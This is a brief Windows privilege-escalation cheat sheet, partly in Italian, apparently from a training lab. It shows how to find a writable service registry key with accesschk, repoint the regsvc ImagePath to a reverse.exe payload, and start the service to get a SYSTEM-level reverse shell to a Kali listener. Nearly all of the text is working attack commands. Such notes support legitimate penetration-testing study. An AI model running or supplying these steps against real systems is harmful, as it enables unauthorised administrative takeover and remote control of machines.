### **ENUMERATION**

Trova un servizio che runni con i privilegi di sistema (SERVICE_START_NAME)
```POWERSHELL
sc qc <servizio>
```
### **EXPLOITATION**

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
```POWERSHELL
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
```POWERSHELL
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```POWERSHELL
net start regsvc
```
